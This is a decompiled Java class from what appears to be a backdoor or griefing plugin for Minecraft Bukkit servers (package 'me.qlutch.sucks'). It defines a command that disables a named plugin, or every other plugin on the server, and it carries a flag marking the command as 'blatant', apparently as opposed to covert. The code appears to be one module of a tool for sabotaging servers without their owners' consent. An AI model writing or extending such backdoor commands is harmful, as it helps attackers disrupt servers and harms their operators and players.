/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  org.bukkit.Bukkit
 *  org.bukkit.entity.Player
 *  org.bukkit.plugin.Plugin
 */
package me.qlutch.sucks.command.impl;

import me.qlutch.sucks.Core;
import me.qlutch.sucks.command.Command;
import me.qlutch.sucks.utils.Settings;
import me.qlutch.sucks.methods.API;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.plugin.Plugin;

public class DisableCommand
extends Command {
    @Override
    public void execute(Core plugin, String msg, String[] args, Player p2) {
        if (args.length <= 1) {
            p2.sendMessage(Settings.USAGE("disable <plugin>"));
        } else if (args[1].equals("*")) {
            for (Plugin pl2 : Bukkit.getServer().getPluginManager().getPlugins()) {
                if (pl2.getName().equals(plugin.getDescription().getName())) continue;
                API.disablePlugin(pl2.getName());
            }
            p2.sendMessage(Settings.PREFIX("You disabled all of the plugins on the server!"));
        } else if (Bukkit.getPluginManager().getPlugin(args[1]) == null) {
            p2.sendMessage(Settings.PREFIX(args[1] + " doesn't exist. (Cap Sensitive)"));
        } else if (Bukkit.getPluginManager().getPlugin(args[1]).isEnabled()) {
            API.disablePlugin(args[1]);
            p2.sendMessage(Settings.PREFIX(Settings.RED + args[1] + Settings.WHITE + " is now disabled"));
        } else {
            p2.sendMessage(Settings.PREFIX(args[1] + " is already disabled!"));
        }
    }

    @Override
    public boolean isBlatant() {
        return true;
    }
}

